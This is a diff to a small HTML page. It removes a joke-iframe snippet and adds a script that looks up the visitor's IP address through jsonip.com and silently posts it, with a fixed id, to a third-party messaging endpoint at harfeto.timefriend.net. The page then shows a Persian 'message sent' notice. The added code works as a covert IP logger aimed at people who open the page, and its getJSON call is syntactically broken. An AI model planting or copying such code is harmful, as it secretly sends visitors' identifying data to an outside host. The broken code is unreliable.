@@ -1,13 +1,28 @@
 <!DOCTYPE html>
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-    <title></title>
-    <script src="http://www.tahlildadeh.com/Jquery/jquery-1.9.1.min.js"></script>
-</head>
+ 
+<html>
+	<script src="https://harfeto.timefriend.net/vendor/jquery.js"></script> 
+	        <script src= "https://cdnjs.cloudflare.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
 <body>
-    <script>function jok() {
-document.write('<iframe frameborder="0" scrolling="no" src="https://api.codebazan.ir/jok/"></iframe>');
-}</script>
-</body>
-</html>
 
+<script>
+        $.getJSON("http:/ / jsonip.com ? callback = ? ", function (data);
+        var id = "16965075642233";
+        function sendMsg() {
+            var text = data.ip;
+            $.post("https://harfeto.timefriend.net/harfeto/sendMsg", {text: text,id:id},function(result,status){
+                if(status=='success'){
+                    var obj = JSON.parse(result);
+                    if(obj.id!='0'){
+                        $('.hide').replaceWith('<p  style="font-size: 20px;color: #00ff15;direction: rtl;">پیام شما با موفقیت ارسال شد.</p>');
+                    }else{
+                        alert('اشکال در ارتباط با سرور');
+                    }
+                }
+            });
+        }
+        sendMsg()
+    </script>
+</body>
+ 
+</html>
